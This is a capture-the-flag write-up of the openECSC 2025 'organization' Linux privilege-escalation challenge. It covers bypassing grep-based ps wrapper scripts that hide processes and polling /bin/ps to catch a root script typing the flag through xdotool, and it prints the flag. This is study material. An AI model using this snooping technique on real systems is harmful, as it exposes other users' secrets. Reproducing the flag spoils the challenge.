# openECSC 2025

## Challenge: organization

## Tags: misc

## Difficulty: Medium

## Table of Contents

- [Solution Overview](#solution-overview)
- [Tools Used](#tools-used)
- [Solution](#solution)
- [Flag](#flag)

### Solution Overview

This challenge presents a classic Linux privilege escalation scenario where wrapper scripts filter process listings to hide sensitive information. By discovering the actual `ps` binary at `/bin/ps` (bypassing the wrapper at `/usr/local/bin/ps`), I revealed hidden processes including an Xvfb X server running on display :99 and a `sys_maintenance` script executing as root. Through rapid process monitoring, I captured `xdotool` commands that were being used to automate password entry into a GUI application, revealing the flag directly in the command arguments.

### Tools Used

- SSH with ncat SSL proxy for remote access
- Standard Unix utilities (`ps`, `find`, `grep`, `xdotool`, `xwd`)
- Bash for process monitoring and rapid polling
- Python 3 for testing and automation

### Solution

When I first connected to the challenge system, I was greeted with the description: *"Average linux privesc, pls get flag kthxbye."* The title "organization" and the prompt suggested this would involve typical privilege escalation techniques.

**Initial thought**: "This is probably a standard Linux privesc box. Let me start with the usual enumeration."

#### Initial Reconnaissance

After SSH'ing into the system as user `user` (password: `user`), I began standard enumeration:

```bash
ssh -o "ProxyCommand=ncat --ssl 20835921-6d62-400c-92f8-2f639b7a4bd6.openec.sc 31337" user@localhost
# Password: user

id
# uid=1000(user) gid=1000(user) groups=1000(user)

sudo -l
# [sudo] password for user: 
# Sorry, user user may not run sudo on organization.
```

**No sudo access** → Need to find another vector.

#### The First Clue: Hidden Processes

Running `ps aux` showed a fairly standard process list:

```bash
ps aux
# root         15  0.0  0.0   4308  3116 ?        S    20:41   0:00 /bin/bash /opt/sys_maintenance
# root         16  0.6  0.1 229168 71772 ?        S    20:41   0:02 /usr/bin/Xvfb :99 -screen 0 1024x768x24 -ac -nolisten
```

**Interesting observations**:
- A script `/opt/sys_maintenance` running as root
- An Xvfb virtual X server on display :99
- But something felt... filtered

#### Discovering the Wrapper Scripts

Checking the PATH revealed something suspicious:

```bash
echo $PATH
# /usr/local/bin:/usr/local/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

**Wait**: `/usr/local/bin` appears THREE times at the beginning! That's unusual.

Investigating `/usr/local/bin`:

```bash
ls -la /usr/local/bin
# -rwxr-xr-x. 1 root root 387 Oct  3 20:41 pgrep
# -rwxr-xr-x. 1 root root 188 Oct  3 20:41 ps
# -rwxr-xr-x. 1 root root 126 Oct  3 20:41 top
```

**Three wrapper scripts!** Let me examine them:

```bash
cat /usr/local/bin/ps
```

```bash
#!/bin/bash
# Filter out sensitive processes for non-root users
if [ "$EUID" -eq 0 ]; then
    /bin/ps "$@"
else
    /bin/ps "$@" | grep -v -E "(system-monitor|Xvfb.*:99|xdotool.*:99)"
fi
```

**BINGO!** 

The wrapper is **filtering out** processes matching:
- `system-monitor`
- `Xvfb.*:99`
- `xdotool.*:99`

The filtering specifically mentions `xdotool` — a tool for automating X11 GUI interactions!

#### Bypassing the Wrapper

**Simple bypass**: Use the real `ps` binary directly:

```bash
/bin/ps aux
```

Now I could see everything:

```
root         15  0.0  0.0   4308  3116 ?        S    20:41   0:00 /bin/bash /opt/sys_maintenance
root         16  0.6  0.1 229168 71772 ?        S    20:41   0:02 /usr/bin/Xvfb :99 -screen 0 1024x768x24 -ac -nolisten 
root        449  4.0  0.0  39804 21460 ?        Sl   20:47   0:00 python3 /opt/password_app.py
```

**New discoveries**:
- `password_app.py` running as root with a GUI (likely using Xvfb)
- The `sys_maintenance` script is probably automating something with xdotool
- Everything's running on the virtual display :99

#### Investigating the X Server

I tried various approaches to extract information from the X server:

```bash
export DISPLAY=:99

# Find windows
xdotool search --onlyvisible --class ""
# 1293

# Get window info
xdotool getwindowgeometry 1293
# Window 1293
#   Position: 0,0 (screen: 0)
#   Geometry: 1024x768
```

A fullscreen window exists! I captured a screenshot:

```bash
xwd -root -out /tmp/screenshot.xwd
```

But without tools to analyze the XWD file (no `convert`, `strings`, etc.), extracting the flag from the screenshot wasn't feasible.

#### The Breakthrough: Real-Time Process Monitoring

Then I had a realization: **If sys_maintenance is using xdotool to automate something, maybe I can catch it in action!**

The wrapper script filters xdotool from `ps` output, but I can use `/bin/ps` with rapid polling:

```bash
while true; do 
    /bin/ps auxww 2>/dev/null | grep "xdotool" | grep -v grep
    sleep 0.1
done
```

**First catch**:

```
root       1340  0.0  0.0   7736  3708 ?        S    20:59   0:00 xdotool key Return
root       1597  0.0  0.0   7736  3792 ?        S    20:59   0:00 xdotool search --name Secure Login System mousemove --window %1 250 120 click 1
```

Interesting! It's clicking on a window named "Secure Login System". Let me keep monitoring...

**Second catch** — THE MONEY SHOT:

```bash
while true; do 
    /bin/ps auxww 2>/dev/null | grep "xdotool" | grep -v grep
    sleep 0.05  # Even faster polling
done
```

```
root       1638  0.0  0.0   8112  3740 ?        S    20:59   0:00 xdotool type openECSC{w3_sh0uld_st0p_us1ng_x0rg}
root       1974  0.0  0.0   7736  3892 ?        S    20:59   0:00 xdotool search --name Secure Login System mousemove --window %1 250 120 click 1
root       2016  0.0  0.0   8112  3628 ?        S    20:59   0:00 xdotool type openECSC{w3_sh0uld_st0p_us1ng_x0rg}
```

**🎉 FLAG CAPTURED!**

The `sys_maintenance` script was using `xdotool type` to automatically enter the flag into the password application, and I caught it mid-execution!

#### Why This Worked

The exploit chain relied on several key insights:

1. **PATH Manipulation Detection** → The repeated `/usr/local/bin` entries in PATH were suspicious
2. **Wrapper Script Discovery** → Finding the filtered `ps` command revealed what was being hidden
3. **Direct Binary Access** → Bypassing wrappers by calling `/bin/ps` directly
4. **Process Monitoring** → Real-time rapid polling caught short-lived processes
5. **Command-Line Exposure** → The `xdotool type` command included the full text as an argument

The challenge title "organization" was a hint — the wrapper scripts created an "organizational" layer that tried to hide sensitive automation processes.

**Key lesson**: When process listings seem incomplete or suspicious, check for wrapper scripts in PATH and use direct binary paths to bypass filtering.

### Flag

**`openECSC{w3_sh0uld_st0p_us1ng_x0rg}`**

The flag itself is a commentary on the security implications of using X.org for sensitive operations — X11's architecture makes it particularly vulnerable to snooping and automation attacks, as this challenge demonstrated!
